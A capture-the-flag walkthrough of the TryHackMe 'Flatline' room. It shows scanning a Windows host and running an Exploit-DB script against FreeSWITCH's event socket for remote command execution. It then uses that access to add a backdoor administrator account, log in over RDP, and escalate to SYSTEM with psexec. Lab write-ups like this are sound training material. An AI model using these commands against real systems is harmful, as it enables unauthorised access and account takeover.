---
description: https://tryhackme.com/room/flatline
---

# Flatline

## Nmap

```
nmap 10.10.39.143 -Pn -p- -sS -sV

PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Starting out with only two ports of which, we can disregard `RDP` for the moment and focus on 8021 which `Nmap` has detected as being "FreeSWITCH mod\_event\_socket".

`mod_event_socket` is a TCP-based interface to control FreeSWITCH, and it operates in two modes, **inbound** and **outbound**.

By default, connections are only allowed from localhost, but this can be changed via configuration files

**Freeswitch:** [https://freeswitch.org/confluence/display/FREESWITCH/mod\_event\_socket](https://freeswitch.org/confluence/display/FREESWITCH/mod\_event\_socket)

With this in mind and when researching exploits on Google we find the following python script on **exploit-db**: [https://www.exploit-db.com/exploits/47799](https://www.exploit-db.com/exploits/47799).

![](<../../../.gitbook/assets/image (2055).png>)

The syntax to be used for the script for command execution:

```python
python exploit.py <IP> <Command>
```

**Note:** When using the script I found I was not seeing any return feedback from the script. I was not sure at the time if this was the script or the target system. Looking at other walk through's after rooting the box I noticed this behaviour is unexpected. However, I have detailed my steps around the issue below as I thought originally, it was intentional.

Going with the above in mind I started sending some basic commands to the box. Without being able to see the results of the command I fired up WireShark and used this to record the command output.

As shown below the current user is an Administrator on the machine.

![](<../../../.gitbook/assets/image (34) (1).png>)

Knowing then I then created a new administrative user and added them to the administrators group.

```python
python exploit.py <IP> 'net user /add viper Password123 && net localgroup "Administrators" /add viper'
```

![](<../../../.gitbook/assets/image (28) (1).png>)

With successful confirmation we can then login as our own administrative user with `xfreerdp` as `RDP` is open.

```bash
xfreerdp /v:10.10.146.100 /u:viper /p:Password123 +clipboard
```

![](<../../../.gitbook/assets/image (200).png>)

After starting command prompt we move over to the user Nekrotic's desktop and grab the `user.txt` flag contents.

![](<../../../.gitbook/assets/image (899).png>)

With `root.txt` we find that we are unable to access due to insufficient permissions. Seeing as we are an admin the best route may be to use `psexec` to escalate to SYSTEM and then to read the file.

Psexec.exe: [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

**Note:** Psexec can be copy and pasted over though `xfreerdp` if executed with the parameter `+clipboard`.

Run `Psexec.exe` with the following to start a command prompt as SYSTEM.

```
psexec.exe -accepteula -s cmd.exe
```

![](<../../../.gitbook/assets/image (398).png>)

Where we can then read the contents of `root.txt`.

![](<../../../.gitbook/assets/image (7) (2).png>)
